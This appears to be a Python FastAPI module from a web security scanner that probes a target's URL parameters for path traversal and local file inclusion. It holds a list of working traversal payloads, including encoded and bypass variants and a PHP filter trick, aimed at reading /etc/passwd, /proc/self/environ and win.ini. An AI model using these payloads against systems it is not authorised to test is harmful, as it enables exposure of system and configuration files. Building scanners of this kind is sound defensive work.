"""Path Traversal / LFI — marker-based zero-FP."""
import base64, re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_get, wrap_finding, standard_response)
from tools._spa_state import load_spa_state
router = APIRouter()
_PAYLOADS = [
    ("../../../../etc/passwd",                  r"root:x:0:0:",     "/etc/passwd"),
    ("../../../../../../etc/passwd",            r"root:x:0:0:",     "/etc/passwd (deep)"),
    ("/etc/passwd",                             r"root:x:0:0:",     "/etc/passwd (absolute)"),
    ("..%2f..%2f..%2fetc%2fpasswd",             r"root:x:0:0:",     "URL-encoded"),
    ("....//....//....//etc/passwd",            r"root:x:0:0:",     "double-dot bypass"),
    ("..%252f..%252f..%252fetc%252fpasswd",     r"root:x:0:0:",     "double URL-encoded"),
    ("../../../../windows/win.ini",             r"\[boot loader\]|\[fonts\]", "Windows win.ini"),
    ("..\\..\\..\\..\\windows\\win.ini",        r"\[boot loader\]|\[fonts\]", "Windows backslash"),
    ("php://filter/convert.base64-encode/resource=index.php", None, "PHP filter base64"),
    ("file:///etc/passwd",                      r"root:x:0:0:",     "file://"),
    ("/proc/self/environ",                      r"PATH=|HOME=",     "/proc/self/environ"),
]

def _check_marker(body, marker):
    if marker is None:
        for chunk in re.findall(r"[A-Za-z0-9+/=]{40,}", body or ""):
            try:
                if "<?php" in base64.b64decode(chunk).decode("utf-8", errors="ignore"):
                    return True
            except: pass
        return False
    try: return re.search(marker, body or "", re.IGNORECASE) is not None
    except: return False

@router.post("/api/scan/lfi")
async def scan_lfi(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target)
    parsed = urlparse(base)
    params_base = parse_qs(parsed.query)
    test_urls = []
    if params_base:
        test_urls.append((base, parsed, params_base))
    spa = load_spa_state(req.target)
    for u in spa.get("urls", []):
        try:
            up = urlparse(u)
            ps = parse_qs(up.query)
            if ps:
                test_urls.append((u, up, ps))
        except Exception:
            continue
    if not test_urls:
        return standard_response(tool="lfi", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="No URL parameters present on base or SPA-discovered endpoints")
    findings, tests, confirmed = [], 0, []
    for tu_url, tu_parsed, params in test_urls[:8]:
      for key in list(params.keys())[:3]:
        for traversal, marker, desc in _PAYLOADS:
            tests += 1
            new_params = {k: v[0] for k, v in params.items()}
            new_params[key] = traversal
            test_url = urlunparse(tu_parsed._replace(query=urlencode(new_params)))
            r = safe_get(test_url, req=req, allow_redirects=True, timeout=12)
            if r is None or r.status_code != 200: continue
            if _check_marker((r.text or "")[:50000], marker):
                findings.append(wrap_finding(
                    f"Path Traversal / LFI in {key!r} — read {desc}",
                    "CRITICAL", cvss="9.8", cwe="CWE-22", owasp="A01:2021",
                    remediation="Validate paths against whitelist; reject '..' and absolute paths.",
                    evidence_marker=f"param={key} payload {traversal!r} returned content matching {marker or 'PHP base64'}"))
                confirmed.append({"param": key, "payload": traversal, "marker": desc})
                break
    return standard_response(tool="lfi", target=req.target, findings=findings,
        tests_performed=max(tests, 1),
        tests_summary=f"Path traversal: {tests} variants with marker verification",
        raw_data={"lfi": {"confirmed": confirmed}})
def register(app): app.include_router(router)
